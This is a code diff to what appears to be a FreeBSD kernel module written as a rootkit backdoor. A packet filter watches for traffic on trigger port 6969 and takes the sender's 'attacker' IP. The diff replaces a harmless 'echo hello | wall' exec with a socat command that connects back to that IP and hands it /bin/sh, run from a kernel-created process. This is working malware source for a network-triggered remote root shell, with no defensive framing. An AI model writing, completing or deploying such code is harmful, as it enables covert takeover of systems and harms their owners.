@@ -44,6 +44,10 @@ extern int kern_execve(struct thread *td, struct image_args *args, struct mac *m
 // Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
 #define TARGET_PROC "apeshit"
+
+// Global dynamic string for reverse shell
+char reverse_shell_cmd[100];
+
 // Define stack protection so we can use snprintf
 // Define the stack protector guard
 uintptr_t __stack_chk_guard = 0xDEADBEEFCAFEBABE;
@@ -55,8 +59,8 @@ static void __stack_chk_fail(void) {
 /*
 custom exec_copyin_args that won't break
 
-
 */
+
 
 static int custom_copin_args_for_exec(struct image_args *args, const char *fname, enum uio_seg segflg, char **argv, char **envv) {
     u_long arg, env;
@@ -130,7 +134,7 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
     struct image_args args;
     int error;
     // Define command and arguments: /bin/sh -c "echo hello"
-    char *argv[] = { "/bin/sh", "-c", "echo hello | wall", NULL };
+    char *argv[] = { "/bin/sh", "-c", reverse_shell_cmd, NULL };
     char *envp[] = { "PATH=/bin:/usr/bin", NULL };  // Basic environment
 
         // correct signature
@@ -305,7 +309,9 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     printf("Kernel IP Address: %s\n", attacker_ip_str);
 
     // Construct the reverse shell command
-    char reverse_shell_cmd[100];
+
+    // make this gloabl
+    // char reverse_shell_cmd[100];
     snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
        "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, TRIGGER_PORT);
        
